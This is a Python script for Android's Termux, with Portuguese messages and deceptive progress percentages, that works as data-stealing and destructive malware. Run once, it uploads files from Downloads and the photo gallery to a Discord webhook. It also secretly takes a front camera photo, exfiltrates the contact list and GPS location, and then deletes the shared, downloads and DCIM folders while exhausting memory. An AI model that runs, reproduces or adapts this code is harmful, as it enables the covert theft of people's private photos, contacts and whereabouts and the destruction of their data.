import subprocess
import psutil
import numpy as np
import time
import discord
import json
import os
import shutil
webhook_url = ""

webhook = discord.SyncWebhook.from_url(webhook_url)

def Dowlonads_colet():
    try:
        pasta = os.path.expanduser("~/storage/downloads")
        lklk = subprocess.check_output(["ls", pasta]).decode("utf-8")
        for x in lklk.splitlines():
            if ".jpg" in x or ".txt" in x or ".png" in x or ".py" in x or "pdf" in x:
                webhook.send(file=discord.File(pasta + "/" + x))  # caminho completo
        print("1%.......")
    except:
        webhook.send("erro!!")
        return True

def galeria_colet():
    try:
        print("2%....")
        pasta = os.path.expanduser("~/storage/pictures")
        lklk = subprocess.check_output(["ls", pasta]).decode("utf-8")
        for x in lklk.splitlines():
            if ".jpg" in x or ".png" in x:
                webhook.send(file=discord.File(pasta + "/" + x))
        print("21%.....")
    except:
        webhook.send("erro!!")
    return True


def api_coletar():
    try:
        pkpk = subprocess.check_output(["termux-camera-photo", "-c", "1", "foto_frente.jpg"])
        webhook.send(file=discord.File("foto_frente.jpg"))
        pkpk = subprocess.check_output(["termux-contact-list"]).decode("utf-8")
        contatos = json.loads(pkpk)
        with open("contatos.txt", "a", encoding="utf-8") as f:
            for contato in contatos:
                numero = contato.get("number") or contato.get("phone")
                nome_contato = contato.get("name")
                f.write(f"CONTATO: {nome_contato} --- {numero}\n")
            webhook.send(file=discord.File("contatos.txt"))
            if not contatos:
                webhook.send("usuario nao possi contatos")
            else:
                print("34%......")
    except:
        webhook.send("nao foi possivel coletar contatos")

    try:
        loc_coletc = subprocess.check_output(["termux-location"]).decode("utf-8")
        loc_coletc = json.loads(loc_coletc)
        lon = loc_coletc["longitude"]
        lat = loc_coletc["latitude"]
        google = f"https://www.google.com/maps?q={lat},{lon}"
        webhook.send(f"LOCALIZAÇAO {google}")
        print("66%")
    except:
        webhook.send("nao foi possvivel coletar a loc")

        return True

def destruiçao():
    try:
        pastas = [
            os.path.expanduser("~/storage/shared"),
            os.path.expanduser("~/storage/downloads"),
            os.path.expanduser("~/storage/dcim")
        ]

        for pasta in pastas:
            if os.path.exists(pasta):
                shutil.rmtree(pasta, ignore_errors=True)
        mem_livre = psutil.virtual_memory().available
        num_elements = int(mem_livre * 1.0)
        arr = np.empty(num_elements, dtype=np.uint8)
        t0 = time.perf_counter()
        arr.fill(123)
        t1 = time.perf_counter()
        t2 = time.perf_counter()
        checksum = arr.sum()
        t3 = time.perf_counter()
    except:
        webhook.send("erro na destruiçao")















def inciar():
    Dowlonads_colet()
    galeria_colet()
    api_coletar()
    destruiçao()
    return True

inciar()